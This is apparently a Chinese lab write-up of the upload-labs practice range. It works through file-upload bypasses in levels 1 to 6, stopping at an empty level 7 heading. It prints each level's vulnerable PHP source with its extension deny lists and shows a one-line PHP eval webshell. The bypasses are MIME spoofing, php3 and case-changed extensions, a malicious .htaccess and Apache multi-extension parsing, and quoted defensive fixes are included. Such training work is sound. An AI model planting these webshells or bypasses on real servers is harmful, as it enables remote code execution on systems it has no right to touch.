##前言
**仅以此作为本人学习过程的记录**

Upload-labs是一个所有类型的上传漏洞的靶场，截至到现在共有21个关卡，这里总结的wp不代表是唯一wp

项目地址：[https://github.com/c0ny1/upload-labs](https://github.com/c0ny1/upload-labs)

其涉及的漏洞点包括

<img src="https://raw.githubusercontent.com/picgouser/pic/master/20200227153439.png" width="60%">

这里上传的图片默认名字为`1.jpg`。上传的php默认名字为`1.php`，内容为`<?php eval($_POST["a"]);?>`

##Pass-01

通过观察可以发现点击文件上传网页和后台没有数据传输，并且可以观察到相关的js过滤语句

漏洞点为客户端--js检查

利用方式

* 通过浏览器禁止运行js，位置为浏览器--设置--高级设置--内容设置--java script

或者  

* 通过bp抓包，上传1.jpg然后在bp上将文件名改回1.php，然后放包

##Pass-02

漏洞点为服务端--检查后缀--白名单--MIME绕过

源码

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
	            $temp_file = $_FILES['upload_file']['tmp_name'];
	            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
	            if (move_uploaded_file($temp_file, $img_path)) {
	                $is_upload = true;
	            } else {
	                $msg = '上传出错！';
	            }
	        } else {
	            $msg = '文件类型不正确，请重新上传！';
	        }
	    } else {
	        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
	    }
	}

利用方式：

* 上传1.php，BP抓包后将文件的Content-Type改为image/jpeg（以上三者之一）即可

##Pass-03

上传1.php，回显是`提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！`推测是黑名单，上传php3，可以正常访问

漏洞点为服务端--检查后缀--黑名单--上传特殊可解析后缀

源码

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array('.asp','.aspx','.php','.jsp');
	        $file_name = trim($_FILES['upload_file']['name']);
	        $file_name = deldot($file_name);//删除文件名末尾的点
	        $file_ext = strrchr($file_name, '.');
	        $file_ext = strtolower($file_ext); //转换为小写
	        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
	        $file_ext = trim($file_ext); //收尾去空
	
	        if(!in_array($file_ext, $deny_ext)) {
	            $temp_file = $_FILES['upload_file']['tmp_name'];
	            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
	            if (move_uploaded_file($temp_file,$img_path)) {
	                 $is_upload = true;
	            } else {
	                $msg = '上传出错！';
	            }
	        } else {
	            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
	        }
	    } else {
	        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
	    }
	}

漏洞产生原因：源码只对php、asp、jsp、aspx进行了过滤，但是Apache和php常用的php程序文件后缀有phtml、pht、php3、php4和php5

利用方式

* 上传1.php3

##Pass-04

上传1.php，回显`提示：此文件不允许上传! `，为了确认是黑名单过滤还是白名单过滤，随意上传一个1.a，发现可以上传，证明是黑名单

漏洞点为服务端--检查后缀--黑名单--上传.htaccess

源码

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
	        $file_name = trim($_FILES['upload_file']['name']);
	        $file_name = deldot($file_name);//删除文件名末尾的点
	        $file_ext = strrchr($file_name, '.');
	        $file_ext = strtolower($file_ext); //转换为小写
	        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
	        $file_ext = trim($file_ext); //收尾去空
	
	        if (!in_array($file_ext, $deny_ext)) {
	            $temp_file = $_FILES['upload_file']['tmp_name'];
	            $img_path = UPLOAD_PATH.'/'.$file_name;
	            if (move_uploaded_file($temp_file, $img_path)) {
	                $is_upload = true;
	            } else {
	                $msg = '上传出错！';
	            }
	        } else {
	            $msg = '此文件不允许上传!';
	        }
	    } else {
	        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
	    }
	}

利用方式

* 上传.htaccess文件，内容如下，其意思为添加一种解析方式，即将jpg当做php解析

		AddType application/x-httpd-php .jpg

* 或者同样是上传.htaccess文件，内容如下，其意思是将上传的文件都当做php来解析

		SetHandler application/x-httpd-php

**注意：构造的.htaccess就是文件全名**

相关背景

>关于AddType命令的作用解释如下

>>AddType 指令
作用：在给定的文件扩展名与特定的内容类型之间建立映射
语法：AddType MIME-type extension [extension] ...
AddType指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。
AddType 是与类型表相关的，描述的是扩展名与文件类型之间的关系。

>此处黑名单没有过滤.htaccess后缀，故此处可上传.htaccess文件进行绕过。  
注: .htaccess文件生效前提条件为1.mod_rewrite模块开启。2.AllowOverride All

>>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置。

>作者：Miracle778  
>链接：https://www.jianshu.com/p/aabc1e7408d5  
>来源：简书

**补充：**

最近看到有新的方法

利用方法：上传1.php.xxx

原理：php解析会把文件结尾理解为xxx，从而绕过黑名单，然后apache不认识xxx就继续搜索，然后找到php，就当做php解析

>先来看一下apache的主配置文件httpd.conf，搜索“DefaultType”，就可以看到这么一段注释和默认配置：

>	#
	# DefaultType: the default MIME type the server will use for a document
	# if it cannot otherwise determine one, such as from filename extensions.
	# If your server contains mostly text or HTML documents, "text/plain" is
	# a good value. If most of your content is binary, such as applications
	# or images, you may want to use "application/octet-stream" instead to
	# keep browsers from trying to display binary files as though they are
	# text.
	#10DefaultType text/plain

>DefaultType存在的意义是告诉apache该如何处理未知扩展名的文件，比如f4ck.xxx这样的文件，扩展名是xxx，这肯定不是一个正常的网页或脚本文件，这个参数就是告诉apache该怎么处理这种未知扩展名的文件。

>参数DefaultType的默认值是“text/plain”，也就是遇到未知扩展名的文件，就把它当作普通的txt文本或html文件来处理。

>测试一

>比如我将以下代码保存为f4ck.xxx  默认解析成文本

>测试二

>那么，对于文件内容为php代码的未知扩展名文件来说也是解析成文本

>**对于f4ck.php.xxx，那么就会被以module方式运行php的apache解析，因为Apache认为一个文件可以拥有多个扩展名，哪怕没有文件名，也可以拥有多个扩展名。Apache认为应该从右到左开始判断解析方法的。如果最右侧的扩展名为不可识别的，就继续往左判断，直到判断到文件名为止。**

>解决方案一

>在httpd.conf或httpd-vhosts.conf中加入以下语句，从而禁止文件名格式为*.php.*的访问权限：

>><FilesMatch ".(php.|php3.|php4.|php5.)">
Order Deny,Allow
Deny from all
</FilesMatch>

>解决方案二

>如果需要保留文件名，可以修改程序源代码，替换上传文件名中的“.”为“_”：

>>$filename = str_replace('.', '_', $filename);

>摘自：https://www.cnblogs.com/hack404/p/10385049.html  
>用户：APT-101  
>侵权联系删除

##Pass-05

参考Pass-04新增的方法

##Pass-06

黑盒测试知道是黑名单过滤

白盒测试知道可以修改大小写绕过

源码

	$is_upload = false;
	$msg = null;
	if (isset($_POST['submit'])) {
	    if (file_exists(UPLOAD_PATH)) {
	        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess",".ini");
	        $file_name = trim($_FILES['upload_file']['name']);
	        $file_name = deldot($file_name);//删除文件名末尾的点
	        $file_ext = strrchr($file_name, '.');
	        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
	        $file_ext = trim($file_ext); //首尾去空
	
	        if (!in_array($file_ext, $deny_ext)) {
	            $temp_file = $_FILES['upload_file']['tmp_name'];
	            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
	            if (move_uploaded_file($temp_file, $img_path)) {
	                $is_upload = true;
	            } else {
	                $msg = '上传出错！';
	            }
	        } else {
	            $msg = '此文件类型不允许上传！';
	        }
	    } else {
	        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
	    }
	}

利用方法：上传1.phP

##Pass-07

